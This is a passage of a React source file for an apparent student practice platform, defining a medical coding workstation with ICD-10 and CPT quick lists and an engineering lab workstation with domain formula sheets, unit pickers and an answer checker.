  { code: "N18.3",  desc: "Chronic kidney disease, stage 3" },
  { code: "I50.9",  desc: "Heart failure, unspecified" },
  { code: "K21.0",  desc: "GERD with oesophagitis" },
  { code: "M54.5",  desc: "Low back pain" },
  { code: "F32.9",  desc: "Major depressive disorder, single episode" },
  { code: "J44.1",  desc: "COPD with acute exacerbation" },
  { code: "Z87.891",desc: "Personal history of nicotine dependence" },
  { code: "A41.9",  desc: "Sepsis, unspecified organism" },
  { code: "S72.001A",desc:"Fracture of femoral neck, initial encounter" },
]
const CPT_QUICK = [
  { code: "99213", desc: "Office/outpatient E/M — low MDM (established)" },
  { code: "99214", desc: "Office/outpatient E/M — moderate MDM (established)" },
  { code: "99215", desc: "Office/outpatient E/M — high MDM (established)" },
  { code: "99232", desc: "Subsequent hospital care — moderate MDM" },
  { code: "93000", desc: "Electrocardiogram, routine ECG, interpretation" },
  { code: "71046", desc: "Chest X-ray, 2 views" },
  { code: "36415", desc: "Collection of venous blood specimen" },
  { code: "80053", desc: "Comprehensive metabolic panel" },
  { code: "85025", desc: "Complete blood count with differential" },
  { code: "93306", desc: "Echocardiography — complete transthoracic" },
  { code: "45378", desc: "Colonoscopy, diagnostic" },
  { code: "99291", desc: "Critical care, first 30–74 minutes" },
]

function MedicalCodingWorkstation({ mission, code, onCodeChange }) {
  const [tab, setTab]         = useState("coding")     // coding | notes | reference
  const [principalDx, setPDx] = useState("")
  const [secondaryDx, setSDx] = useState(["","",""])
  const [cptCodes,   setCPT]  = useState(["","",""])
  const [modifiers,  setMod]  = useState(["",""])
  const [codeSearch, setCS]   = useState("")

  // Sync structured form → code editor for submission
  useEffect(() => {
    if (tab !== "coding") return
    const lines = [
      `# Coding Assignment`,
      `## ${mission?.title || "Mission"}`,
      ``,
      `### Principal Diagnosis`,
      principalDx ? `- ${principalDx}` : `- [Enter ICD-10 code + description]`,
      ``,
      `### Secondary Diagnoses`,
      ...secondaryDx.filter(Boolean).map(d => `- ${d}`),
      secondaryDx.every(d => !d) ? "- [None documented]" : "",
      ``,
      `### CPT Procedure Codes`,
      ...cptCodes.filter(Boolean).map(c => `- ${c}`),
      cptCodes.every(c => !c) ? "- [None documented]" : "",
      ``,
      `### Modifiers`,
      modifiers.filter(Boolean).length ? modifiers.filter(Boolean).map(m => `- ${m}`).join("\n") : "- None",
      ``,
      `### Coding Rationale`,
      `[Document your coding logic, guideline references, and sequencing rationale here]`,
    ].join("\n")
    onCodeChange(lines)
  }, [principalDx, secondaryDx, cptCodes, modifiers, tab]) // eslint-disable-line

  const filteredICD = ICD10_QUICK.filter(r =>
    !codeSearch || r.code.toLowerCase().includes(codeSearch.toLowerCase()) || r.desc.toLowerCase().includes(codeSearch.toLowerCase()))
  const filteredCPT = CPT_QUICK.filter(r =>
    !codeSearch || r.code.includes(codeSearch) || r.desc.toLowerCase().includes(codeSearch.toLowerCase()))

  const inputStyle = {
    width: "100%", padding: "5px 8px", border: `1px solid ${T.border}`,
    borderRadius: 5, fontSize: 11, fontFamily: "monospace", outline: "none", boxSizing: "border-box",
  }
  const labelStyle = { fontSize: 10, fontWeight: 700, color: T.ink3, textTransform: "uppercase", marginBottom: 3, display: "block" }

  return (
    <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", minHeight: 0 }}>
      {/* Tab bar */}
      <div style={{ display: "flex", borderBottom: `1px solid ${T.border}`, background: T.bg2, flexShrink: 0 }}>
        {[["coding","🩺 Code Entry"],["reference","📖 Code Lookup"],["notes","📋 Raw Notes"]].map(([id,label]) => (
          <button key={id} onClick={() => setTab(id)} style={{
            padding: "7px 14px", border: "none",
            borderBottom: tab === id ? `2px solid ${T.purple}` : "2px solid transparent",
            background: "transparent", fontSize: 11, fontWeight: tab === id ? 800 : 500,
            color: tab === id ? T.purple : T.ink3, cursor: "pointer",
          }}>{label}</button>
        ))}
      </div>

      {/* ── Code Entry Panel ──────────────────────────────────────────────── */}
      {tab === "coding" && (
        <div style={{ flex: 1, overflow: "auto", padding: 14 }}>
          {/* Principal Diagnosis */}
          <div style={{ marginBottom: 14 }}>
            <span style={labelStyle}>🔴 Principal Diagnosis (ICD-10-CM)</span>
            <input style={{ ...inputStyle, borderColor: principalDx ? T.green : T.border }}
              placeholder="e.g. J18.9 — Pneumonia, unspecified"
              value={principalDx} onChange={e => setPDx(e.target.value)}
            />
            <div style={{ fontSize: 10, color: T.ink3, marginTop: 3 }}>
              The condition established to be chiefly responsible for the visit/admission.
            </div>
          </div>

          {/* Secondary Diagnoses */}
          <div style={{ marginBottom: 14 }}>
            <span style={labelStyle}>🟡 Secondary Diagnoses / CCs / MCCs (ICD-10-CM)</span>
            {secondaryDx.map((dx, i) => (
              <input key={i} style={{ ...inputStyle, marginBottom: 4 }}
                placeholder={`Secondary Dx ${i+1} — e.g. I10 — Essential hypertension`}
                value={dx} onChange={e => { const a = [...secondaryDx]; a[i]=e.target.value; setSDx(a) }}
              />
            ))}
            <button onClick={() => setSDx(d => [...d, ""])} style={{
              fontSize: 10, padding: "2px 8px", border: `1px solid ${T.border}`,
              borderRadius: 4, background: T.bg, color: T.ink3, cursor: "pointer", marginTop: 2,
            }}>+ Add Secondary Dx</button>
          </div>

          {/* CPT Codes */}
          <div style={{ marginBottom: 14 }}>
            <span style={labelStyle}>🔵 CPT Procedure Codes</span>
            {cptCodes.map((c, i) => (
              <input key={i} style={{ ...inputStyle, marginBottom: 4 }}
                placeholder={`CPT ${i+1} — e.g. 99214 — Office/outpatient E/M moderate MDM`}
                value={c} onChange={e => { const a = [...cptCodes]; a[i]=e.target.value; setCPT(a) }}
              />
            ))}
            <button onClick={() => setCPT(c => [...c, ""])} style={{
              fontSize: 10, padding: "2px 8px", border: `1px solid ${T.border}`,
              borderRadius: 4, background: T.bg, color: T.ink3, cursor: "pointer", marginTop: 2,
            }}>+ Add CPT Code</button>
          </div>

          {/* Modifiers */}
          <div style={{ marginBottom: 14 }}>
            <span style={labelStyle}>🟢 Modifiers</span>
            <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
              {modifiers.map((m, i) => (
                <input key={i} style={{ ...inputStyle, width: 120 }}
                  placeholder={`Mod ${i+1} (e.g. 25)`}
                  value={m} onChange={e => { const a = [...modifiers]; a[i]=e.target.value; setMod(a) }}
                />
              ))}
              <button onClick={() => setMod(m => [...m, ""])} style={{
                fontSize: 10, padding: "2px 8px", border: `1px solid ${T.border}`,
                borderRadius: 4, background: T.bg, color: T.ink3, cursor: "pointer",
              }}>+ Modifier</button>
            </div>
          </div>

          {/* Coding rationale hint */}
          <div style={{ background: "#EFF6FF", border: "1px solid #BFDBFE", borderRadius: 8, padding: "10px 12px", fontSize: 11, color: "#1D4ED8" }}>
            <strong>📝 Coding Rationale:</strong> After filling codes above, switch to Raw Notes tab to add your ICD-10 guideline references, sequencing rationale, and documentation support.
          </div>
        </div>
      )}

      {/* ── Code Lookup Panel ─────────────────────────────────────────────── */}
      {tab === "reference" && (
        <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
          <div style={{ padding: "8px 12px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
            <input style={{ ...inputStyle, borderColor: T.blue }}
              placeholder="Search code or description (e.g. J18, diabetes, echocardiography)…"
              value={codeSearch} onChange={e => setCS(e.target.value)}
              autoFocus
            />
          </div>
          <div style={{ flex: 1, overflow: "auto", padding: 12 }}>
            {/* ICD-10 */}
            <div style={{ fontSize: 10, fontWeight: 800, color: T.ink3, textTransform: "uppercase", marginBottom: 6 }}>ICD-10-CM — Common Codes</div>
            {filteredICD.map(({ code: c, desc }) => (
              <div key={c} onClick={() => { setPDx(p => p ? p : `${c} — ${desc}`); setTab("coding") }}
                style={{ display: "flex", gap: 10, padding: "5px 8px", borderRadius: 5, cursor: "pointer", marginBottom: 2,
                  background: "transparent", border: `1px solid transparent`,
                }}
                onMouseEnter={e => e.currentTarget.style.background = T.blue2}
                onMouseLeave={e => e.currentTarget.style.background = "transparent"}
              >
                <span style={{ fontFamily: "monospace", fontSize: 11, fontWeight: 700, color: T.blue, width: 80, flexShrink: 0 }}>{c}</span>
                <span style={{ fontSize: 11, color: T.ink2 }}>{desc}</span>
              </div>
            ))}

            {/* CPT */}
            <div style={{ fontSize: 10, fontWeight: 800, color: T.ink3, textTransform: "uppercase", margin: "14px 0 6px" }}>CPT Procedure Codes — Common Codes</div>
            {filteredCPT.map(({ code: c, desc }) => (
              <div key={c} onClick={() => { setCPT(a => { const n=[...a]; const i=n.findIndex(x=>!x); if(i>=0)n[i]=`${c} — ${desc}`; return n }); setTab("coding") }}
                style={{ display: "flex", gap: 10, padding: "5px 8px", borderRadius: 5, cursor: "pointer", marginBottom: 2 }}
                onMouseEnter={e => e.currentTarget.style.background = T.blue2}
                onMouseLeave={e => e.currentTarget.style.background = "transparent"}
              >
                <span style={{ fontFamily: "monospace", fontSize: 11, fontWeight: 700, color: T.purple, width: 80, flexShrink: 0 }}>{c}</span>
                <span style={{ fontSize: 11, color: T.ink2 }}>{desc}</span>
              </div>
            ))}
            <div style={{ marginTop: 12, fontSize: 10, color: T.ink4, fontStyle: "italic" }}>
              Click any code to auto-insert into the Code Entry panel → Principal Dx field (ICD-10) or next CPT slot.
            </div>
          </div>
        </div>
      )}

      {/* ── Raw Notes / Rationale ─────────────────────────────────────────── */}
      {tab === "notes" && (
        <div style={{ flex: 1, overflow: "hidden", display: "flex", flexDirection: "column" }}>
          <PanelHeader color={T.ink3}>Coding Notes, Rationale & Guideline References</PanelHeader>
          <MonoTextarea
            value={code}
            onChange={onCodeChange}
            placeholder={`# Coding Rationale\n\n## Principal Diagnosis\nICD-10: [code] — [description]\nRationale: [Why this is the principal Dx per UHDDS definition]\nDocumentation support: [Cite from note — "Attending confirmed pneumonia on day 1"]\n\n## Secondary Diagnoses\n[code] — CC/MCC impact on DRG: [note if applicable]\n\n## CPT Codes\n[code] — [Why this E/M level: MDM complexity OR time]\nModifiers applied: [25, 59, etc. and rationale]\n\n## Guideline References\n- ICD-10-CM Official Guidelines, Section II.A: ...\n- AHA Coding Clinic Q1 2023: ...\n- NCCI Edits: ...\n\n## DRG Assignment\nDRG [#]: [name] — Weight: [x.xx] — Impact of MCCs: [note]`}
          />
        </div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// ENGINEERING LAB WORKSTATION
// A professional, domain-aware workspace for ECE, EEE, Mechanical, Civil,
// Pharmacy, and MBA students. Each domain gets:
//   • Themed header with domain identity
//   • Domain-specific formula reference sheet
//   • Professional tools panel (MATLAB, ANSYS, ETAP, STAAD, etc.)
//   • Scratchpad for rough calculations
//   • Answer input with domain-relevant units
//   • Step-by-step solution reveal
// ─────────────────────────────────────────────────────────────────────────────
const ENGINEERING_DOMAIN_CONFIG = {
  ECE: {
    label: "Electronics & Communication Lab", emoji: "📡", color: "#0891B2", bgColor: "#ECFEFF",
    tabs: ["Circuit Analysis", "Signal Processing", "Digital Systems", "Communication"],
    units: ["Ω", "V", "A", "Hz", "kHz", "MHz", "dB", "W", "mW", "F", "H", "s", "ms", "bps"],
    refs: [
      { label: "Ohm's Law",           formula: "V = I × R" },
      { label: "Power",               formula: "P = VI = I²R = V²/R" },
      { label: "Capacitive Reactance",formula: "Xc = 1 / (2πfC)" },
      { label: "Inductive Reactance", formula: "XL = 2πfL" },
      { label: "RC Time Constant",    formula: "τ = R × C" },
      { label: "Op-Amp Voltage Gain", formula: "Av = −Rf / Rin  (inverting)" },
      { label: "Op-Amp Non-inv Gain", formula: "Av = 1 + Rf / Rin" },
      { label: "Shannon Capacity",    formula: "C = B × log₂(1 + S/N)" },
      { label: "Friis Path Loss",     formula: "PL(dB) = 20log(4πd/λ)" },
      { label: "Nyquist Rate",        formula: "fs ≥ 2 × fmax" },
      { label: "AM Bandwidth",        formula: "BW = 2 × fm" },
      { label: "Q-Factor (Resonance)",formula: "Q = f₀ / BW = (1/R)√(L/C)" },
    ],
    tools: ["MATLAB / Simulink", "Multisim / LTSpice", "OrCAD / KiCad", "Proteus", "Verilog / VHDL", "MATLAB Signal Toolbox"],
    workEnv: "PCB Design · Circuit Simulation · Signal Processing · Embedded Systems · Satellite Communication · Antenna Design",
  },
  EEE: {
    label: "Electrical Power Systems Lab", emoji: "⚡", color: "#D97706", bgColor: "#FFFBEB",
    tabs: ["AC / DC Circuits", "Power Systems", "Motors & Transformers", "Protection & Safety"],
    units: ["V", "kV", "A", "kA", "Ω", "W", "kW", "MW", "kVA", "kVAR", "Hz", "rpm", "%", "PF"],
    refs: [
      { label: "Ohm's Law (AC)",      formula: "V = I × Z,  Z = R + jX" },
      { label: "Real Power (1-ph)",   formula: "P = V × I × cos φ" },
      { label: "Reactive Power",      formula: "Q = V × I × sin φ  (VAR)" },
      { label: "Apparent Power",      formula: "S = V × I = √(P² + Q²)  (VA)" },
      { label: "Power Factor",        formula: "PF = cos φ = P / S" },
      { label: "3-Phase Power",       formula: "P = √3 × VL × IL × cos φ" },
      { label: "Transformer Ratio",   formula: "V1/V2 = N1/N2 = I2/I1" },
      { label: "Transformer η",       formula: "η = Output / Input × 100%" },
      { label: "Synchronous Speed",   formula: "Ns = 120f / P  (rpm)" },
      { label: "Motor Slip",          formula: "s = (Ns − N) / Ns × 100%" },
      { label: "Voltage Regulation",  formula: "VR% = (VNL − VFL)/VFL × 100" },
      { label: "Cable Voltage Drop",  formula: "VD = I(R cosφ + X sinφ)L" },
    ],
    tools: ["ETAP", "MATLAB / Simulink", "AutoCAD Electrical", "PSCAD", "PSSE", "DIgSILENT PowerFactory", "SCADA / PLC (Ladder Logic)"],
    workEnv: "Power Station Design · HV Transmission Lines · Transformer Sizing · Motor Control · PLC Programming · Smart Grid",
  },
  Mechanical: {
    label: "Mechanical Engineering Workshop", emoji: "⚙️", color: "#374151", bgColor: "#F9FAFB",
    tabs: ["Stress & Design", "Manufacturing & Welding", "Thermodynamics", "Fluid Mechanics"],
    units: ["MPa", "GPa", "kN", "N", "mm", "m", "m/s", "kg", "kJ", "kW", "°C", "K", "rpm", "N·m", "Pa"],
    refs: [
      { label: "Direct Stress",       formula: "σ = F / A  (Pa or MPa)" },
      { label: "Shear Stress",        formula: "τ = F / A  (on shear plane)" },
      { label: "Young's Modulus",     formula: "E = σ / ε  (Steel ≈ 200 GPa)" },
      { label: "Factor of Safety",    formula: "FoS = Ultimate Strength / Working Stress" },
      { label: "Bending Stress",      formula: "σ = M × y / I  (beam)" },
      { label: "Shaft Power",         formula: "P = T × ω = 2πNT / 60" },
      { label: "Gear Ratio",          formula: "GR = N_driven / N_driver = T2 / T1" },
      { label: "Welding Heat Input",  formula: "H = (V × I × 60) / (travel speed × 1000)  kJ/mm" },
      { label: "Carnot Efficiency",   formula: "η_Carnot = 1 − TL / TH  (use K)" },
      { label: "Fourier Heat Cond.", formula: "Q = k × A × ΔT / L  (W)" },
      { label: "Reynolds Number",     formula: "Re = ρVD / μ  (<2300 laminar)" },
      { label: "Bernoulli",           formula: "P + ½ρV² + ρgh = const" },
    ],
    tools: ["SolidWorks / CATIA", "AutoCAD", "ANSYS / ABAQUS", "Fusion 360", "MasterCAM (CNC)", "MATLAB", "Pro/Engineer"],
    workEnv: "CAD/CAM Design · Stress Analysis · CNC Machining · Welding · Thermodynamic Systems · Fluid Power · GD&T",
  },
  Civil: {
    label: "Civil Engineering Design Studio", emoji: "🏗️", color: "#92400E", bgColor: "#FFF7ED",
    tabs: ["Structural Analysis", "Geotechnical", "Transportation", "Hydraulics & Water"],
    units: ["kN", "kN/m", "kN/m²", "MPa", "N/mm²", "mm", "m", "%", "m³/s", "litres/day", "t", "kPa"],
    refs: [
      { label: "BM — UDL Simply Supported", formula: "M_max = w L² / 8  (at mid-span)" },
      { label: "SF — UDL",                  formula: "V_max = w L / 2  (at supports)" },
      { label: "Deflection — UDL",          formula: "δ = 5wL⁴ / 384EI" },
      { label: "Slenderness Ratio",         formula: "λ = L_eff / r_min" },
      { label: "Column Euler Load",         formula: "P_cr = π²EI / L_eff²" },
      { label: "w/c Ratio (concrete)",      formula: "w/c = Water wt / Cement wt  (lower → stronger)" },
      { label: "Darcy's Law",              formula: "q = k × i × A  (seepage)" },
      { label: "Manning's Equation",       formula: "V = (1/n) R^(2/3) S^(1/2)" },
      { label: "Terzaghi Bearing Cap.",    formula: "qu = cNc + γDNq + 0.5γBNγ" },
      { label: "SSD (Stopping Sight Dist)",formula: "SSD = vt + v²/(254f)" },
      { label: "Population Projection",   formula: "Pt = P0(1 + r/100)^n" },
      { label: "BOD Removal Efficiency", formula: "E% = (L0 − Lt)/L0 × 100" },
    ],
    tools: ["STAAD.Pro / ETABS", "AutoCAD Civil 3D", "SAP2000 / SAFE", "HEC-RAS", "PLAXIS / GeoSlope", "PTV VISSIM", "REVIT"],
    workEnv: "RCC Structure Design · Bridge Analysis · Road & Highway Design · Water Supply · Sewage Treatment · Foundation Engineering",
  },
  Pharmacy: {
    label: "Pharmaceutical Sciences Lab", emoji: "💊", color: "#059669", bgColor: "#F0FDF4",
    tabs: ["Drug Calculations", "Pharmacokinetics", "Formulation & Compounding", "Clinical Pharmacy"],
    units: ["mg", "mcg", "g", "mL", "L", "mg/kg", "mg/L", "mcg/mL", "units/mL", "h", "days", "%"],
    refs: [
      { label: "Weight-Based Dose",    formula: "Dose = patient_wt (kg) × dose/kg" },
      { label: "Concentration",        formula: "C = mass / volume  (mg/mL)" },
      { label: "Half-Life",            formula: "t½ = 0.693 / Ke" },
      { label: "Volume of Distrib.",   formula: "Vd = Dose / C₀  (L/kg)" },
      { label: "Clearance",            formula: "CL = Ke × Vd = Dose / AUC" },
      { label: "Infusion Rate",        formula: "Rate = dose/kg/min × wt / concentration" },
      { label: "Creatinine Clearance", formula: "CrCl = (140−age)×wt / (72×SCr)  [×0.85 for female]" },
      { label: "Dilution (C1V1=C2V2)", formula: "C1V1 = C2V2" },
      { label: "% w/v Strength",       formula: "% w/v = (g/100 mL) × 100" },
      { label: "Bioavailability (F)",  formula: "F = (AUC_oral / AUC_IV) × (D_IV / D_oral)" },
      { label: "Therapeutic Index",    formula: "TI = TD50 / ED50" },
      { label: "Shelf-Life (t90%)",    formula: "t90% = 0.105 / k  (first-order)" },
    ],
    tools: ["Excel / StatPlus", "GraphPad Prism", "Phoenix WinNonlin", "NONMEM", "Monolix", "SPSS / SAS", "R"],
    workEnv: "Drug Dosage Calculation · Clinical Trials · Pharmacovigilance · Quality Control · Regulatory Affairs (CDSCO / FDA)",
  },
  MBA: {
    label: "Business Analytics Studio", emoji: "📊", color: "#7C3AED", bgColor: "#F5F3FF",
    tabs: ["Finance & Accounting", "Marketing & Sales", "Operations Management", "Strategy & HR"],
    units: ["₹", "Lakhs", "Crores", "%", "days", "units", "ratio", "score", "months"],
    refs: [
      { label: "NPV",                  formula: "NPV = Σ[CFt/(1+r)^t] − C0" },
      { label: "IRR",                  formula: "Rate that makes NPV = 0" },
      { label: "Payback Period",       formula: "PP = Initial Investment / Annual CF" },
      { label: "ROI",                  formula: "ROI% = (Net Profit / Cost) × 100" },
      { label: "Gross Margin",         formula: "GM% = (Revenue − COGS) / Revenue × 100" },
      { label: "Break-Even (units)",   formula: "BEP = Fixed Cost / (Price − Variable Cost)" },
      { label: "Market Share",         formula: "MS% = Co. Sales / Total Market × 100" },
      { label: "Inventory Turnover",   formula: "IT = COGS / Avg Inventory" },
      { label: "Current Ratio",        formula: "CR = Current Assets / Current Liabilities" },
      { label: "EOQ",                  formula: "EOQ = √(2DS/H)  D=demand, S=order cost, H=holding" },
      { label: "CAGR",                 formula: "CAGR = (End/Start)^(1/n) − 1" },
      { label: "Debt-to-Equity",       formula: "D/E = Total Debt / Shareholders' Equity" },
    ],
    tools: ["Excel / PowerBI", "Tableau", "SAP ERP", "Salesforce CRM", "Tally / QuickBooks", "R / Python (Pandas)", "SPSS"],
    workEnv: "Financial Analysis · Market Research · Supply Chain · Strategic Planning · Business Development · HR Analytics",
  },
  IoT: {
    label: "IoT & Embedded Systems Lab", emoji: "🌐", color: "#0F766E", bgColor: "#F0FDFA",
    tabs: ["Embedded Systems", "Wireless Protocols", "Sensor & Actuator", "Cloud & Data"],
    units: ["V", "mA", "μA", "Ω", "Hz", "kHz", "MHz", "ms", "μs", "dBm", "bps", "kbps"],
    refs: [
      { label: "ADC Resolution",       formula: "Vout = (Vin / Vref) × 2^n  (n=bits)" },
      { label: "PWM Duty Cycle",       formula: "D% = (t_on / T_period) × 100" },
      { label: "Timer Frequency",      formula: "f = Clock / (Prescaler × (ARR+1))" },
      { label: "UART Baud Rate",       formula: "Baud = bits_per_second" },
      { label: "I²C Clock Stretch",    formula: "t_SCL = 1 / f_SCL" },
      { label: "RSSI → Distance",      formula: "d = 10^[(TxPower − RSSI)/(10×n)]" },
      { label: "LoRa Air Time",        formula: "ToA = (payload_symbols / BW) × SF" },
      { label: "Power Consumption",    formula: "E = I × V × t  (joules or mAh)" },
      { label: "NTC Thermistor",       formula: "R(T) = R0 × exp[B(1/T − 1/T0)]" },
      { label: "Sampling Theorem",     formula: "fs ≥ 2 × fmax  (Nyquist)" },
    ],
    tools: ["Arduino IDE", "STM32CubeIDE", "Raspberry Pi", "Node-RED", "MQTT Broker", "AWS IoT / Azure IoT", "Proteus / Fritzing"],
    workEnv: "Microcontroller Programming · PCB Design · MQTT/CoAP Protocols · Cloud Integration · Edge Computing · Smart Sensors",
  },
}

function EngineeringLabWorkstation({ mission, code, onCodeChange }) {
  const config = ENGINEERING_DOMAIN_CONFIG[mission.category] || ENGINEERING_DOMAIN_CONFIG.ECE
  const [tab,          setTab]          = useState(config.tabs[0])
  const [answer,       setAnswer]       = useState(code || "")
  const [unit,         setUnit]         = useState(config.units[0])
  const [checked,      setChecked]      = useState(null)   // null | "correct" | "wrong"
  const [scratchpad,   setScratchpad]   = useState("")
  const [showSolution, setShowSolution] = useState(false)
  const [showRef,      setShowRef]      = useState(true)
  const [attempts,     setAttempts]     = useState(0)
  const [activePanel,  setActivePanel]  = useState("solve") // "solve" | "ref" | "tools"

  // Parse expected answer from test_cases
  const expected = (() => {
    try {
      const tc = mission.test_cases || mission.testCases || []
      const arr = typeof tc === "string" ? JSON.parse(tc) : tc
      if (arr?.[0]) return String(arr[0].expected_output ?? arr[0].expected ?? "")
    } catch { /* noop */ }
    try {
      const ex = mission.examples || []
      const arr = typeof ex === "string" ? JSON.parse(ex) : ex
      if (arr?.[0]) return String(arr[0].output ?? arr[0].expected ?? "")
    } catch { /* noop */ }
    return null
  })()

  const solutionText = mission.editorial || ""

  const handleCheck = () => {
    if (!answer.trim()) return
    setAttempts(n => n + 1)
    const userRaw = answer.trim().replace(/,/g, "").toLowerCase()
    const expRaw  = (expected || "").trim().replace(/,/g, "").toLowerCase()
    const uNum = parseFloat(userRaw), eNum = parseFloat(expRaw)
    const isNum = !isNaN(uNum) && !isNaN(eNum)
    const ok = isNum ? Math.abs(uNum - eNum) <= Math.abs(eNum) * 0.01 + 0.01 : userRaw === expRaw
    setChecked(ok ? "correct" : "wrong")
    onCodeChange(`Answer: ${answer.trim()} ${unit}`)
    try {
      registerValidator(() => [{
        passed: ok,
        input: "Answer check",
        expected: expected ? `${expected} ${unit}` : "—",
        actual: `${answer.trim()} ${unit}`,
      }])
    } catch { /* noop */ }
  }

  const borderCol = checked === "correct" ? "#22C55E" : checked === "wrong" ? "#EF4444" : config.color
  const answerBg  = checked === "correct" ? "#F0FDF4"  : checked === "wrong" ? "#FFF5F5"  : "#fff"

  // ── Shared input group ─────────────────────────────────────────
  function AnswerInput() {
    return (
      <div style={{ background: "#fff", border: `1px solid ${T.border}`, borderRadius: 14, padding: 20 }}>
        <div style={{ fontSize: 12, fontWeight: 800, color: T.ink, marginBottom: 10 }}>Your Answer</div>
        <div style={{ display: "flex", gap: 8, alignItems: "center", flexWrap: "wrap" }}>
          <input
            type="text" value={answer} placeholder="Enter computed value…"
            onChange={e => { setAnswer(e.target.value); setChecked(null) }}
            onKeyDown={e => e.key === "Enter" && handleCheck()}
            style={{ flex: 1, minWidth: 140, padding: "11px 14px", fontSize: 22, fontWeight: 700,
              fontFamily: "'DM Mono', monospace", color: T.ink, border: `2px solid ${borderCol}`,
              borderRadius: 9, outline: "none", background: answerBg }}
          />
          {/* Unit picker */}
          <select value={unit} onChange={e => setUnit(e.target.value)}
            style={{ padding: "11px 10px", borderRadius: 9, border: `1px solid ${T.border}`,
              fontSize: 13, fontWeight: 700, color: config.color, background: "#fff",
              cursor: "pointer", fontFamily: "inherit" }}>
            {config.units.map(u => <option key={u} value={u}>{u}</option>)}
          </select>
          <button onClick={handleCheck} disabled={!answer.trim()}
            style={{ padding: "11px 20px", background: config.color, color: "#fff", border: "none",
              borderRadius: 9, fontSize: 13, fontWeight: 800, cursor: answer.trim() ? "pointer" : "not-allowed",
              opacity: answer.trim() ? 1 : 0.45, fontFamily: "inherit", whiteSpace: "nowrap" }}>
            ✓ Check
          </button>
        </div>
        {checked === "correct" && (
          <div style={{ marginTop: 12, padding: "10px 14px", background: "#F0FDF4", border: "1px solid #BBF7D0", borderRadius: 9, display: "flex", gap: 10, alignItems: "center" }}>
            <span style={{ fontSize: 18 }}>✅</span>
            <div>
              <div style={{ fontSize: 13, fontWeight: 800, color: "#15803D" }}>Correct!</div>
              <div style={{ fontSize: 11, color: "#166534" }}>Click "Submit Solution" to lock in your proof record.</div>
            </div>
          </div>
        )}
        {checked === "wrong" && (
          <div style={{ marginTop: 12, padding: "10px 14px", background: "#FFF5F5", border: "1px solid #FECACA", borderRadius: 9, display: "flex", gap: 10, alignItems: "flex-start" }}>
            <span style={{ fontSize: 18 }}>❌</span>
            <div>
              <div style={{ fontSize: 13, fontWeight: 800, color: "#DC2626" }}>Not quite — attempt #{attempts}</div>
              <div style={{ fontSize: 11, color: "#991B1B", marginTop: 2 }}>
                Check your formula and units. Use the scratchpad below for step-by-step working.
                {attempts >= 2 && <> ·{" "}<button onClick={() => setShowSolution(true)} style={{ background: "none", border: "none", color: "#991B1B", fontWeight: 800, cursor: "pointer", textDecoration: "underline", fontSize: 11, padding: 0 }}>Show solution</button></>}
              </div>
            </div>
          </div>
        )}
      </div>
    )
  }

  return (
    <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", background: T.bg }}>

      {/* ── Domain header strip ───────────────────────────────── */}
      <div style={{ background: "#fff", borderBottom: `1px solid ${T.border}`, padding: "0 14px", display: "flex", alignItems: "center", gap: 0, flexShrink: 0 }}>
        {/* Domain identity */}
        <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "10px 0", marginRight: 20, flexShrink: 0 }}>
          <span style={{ fontSize: 18 }}>{config.emoji}</span>
          <div>
            <div style={{ fontSize: 11, fontWeight: 800, color: config.color, letterSpacing: 0.6, textTransform: "uppercase" }}>{config.label}</div>
            <div style={{ fontSize: 10, color: T.ink4 }}>{config.workEnv.split(" · ").slice(0, 3).join(" · ")}</div>
          </div>
        </div>
        {/* Domain-area sub-tabs */}
        <div style={{ display: "flex", overflowX: "auto", gap: 0, flex: 1 }}>
          {config.tabs.map(t => (
            <button key={t} onClick={() => setTab(t)}
              style={{ padding: "0 14px", height: 48, border: "none", background: "none", fontFamily: "inherit",
                fontSize: 11, fontWeight: tab === t ? 800 : 500, color: tab === t ? config.color : T.ink4,
                borderBottom: tab === t ? `2.5px solid ${config.color}` : "2.5px solid transparent",
                cursor: "pointer", whiteSpace: "nowrap", flexShrink: 0 }}>
              {t}
            </button>
          ))}
        </div>
        {/* Panel toggle pills */}
        <div style={{ display: "flex", gap: 5, flexShrink: 0, marginLeft: 10 }}>
          {[["solve","✏️ Solve"],["ref","📐 Ref"],["tools","🔧 Tools"]].map(([p, label]) => (
            <button key={p} onClick={() => setActivePanel(activePanel === p && p !== "solve" ? "solve" : p)}
              style={{ padding: "4px 10px", borderRadius: 6, border: `1px solid ${activePanel === p ? config.color : T.border}`,
                background: activePanel === p ? `${config.color}12` : "#fff",
                color: activePanel === p ? config.color : T.ink4,
                fontSize: 10, fontWeight: 700, cursor: "pointer", fontFamily: "inherit" }}>
              {label}
            </button>
          ))}
        </div>
      </div>

      {/* ── Body: panels ─────────────────────────────────────── */}
      <div style={{ flex: 1, display: "flex", overflow: "hidden", minHeight: 0 }}>

        {/* CENTER: Solve panel (always visible) */}
        <div style={{ flex: 1, overflowY: "auto", padding: 18, display: "flex", flexDirection: "column", gap: 14 }}>

          {/* Area context badge */}
          <div style={{ display: "inline-flex", alignItems: "center", gap: 8 }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: config.color, letterSpacing: 0.7, textTransform: "uppercase",
              background: `${config.color}12`, padding: "3px 10px", borderRadius: 99, border: `1px solid ${config.color}25` }}>
              {tab}
            </span>
            {mission.difficulty && (
              <span style={{ fontSize: 10, fontWeight: 700, padding: "3px 9px", borderRadius: 99,
                color: mission.difficulty === "Easy" ? "#16A34A" : mission.difficulty === "Medium" ? "#D97706" : "#DC2626",
                background: mission.difficulty === "Easy" ? "#F0FDF4" : mission.difficulty === "Medium" ? "#FFFBEB" : "#FEF2F2" }}>
                {mission.difficulty}
              </span>
            )}
          </div>

          {/* Answer input */}
          <AnswerInput />

          {/* Scratchpad — working area */}
          <div style={{ background: "#fff", border: `1px solid ${T.border}`, borderRadius: 14, overflow: "hidden" }}>
            <div style={{ padding: "9px 16px", background: "#F8F7F4", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 11 }}>📝</span>
              <span style={{ fontSize: 11, fontWeight: 700, color: T.ink3 }}>Scratchpad — Working Area</span>
              <span style={{ fontSize: 10, color: T.ink4, marginLeft: 4 }}>not submitted · use for rough calculations</span>
            </div>
            <textarea
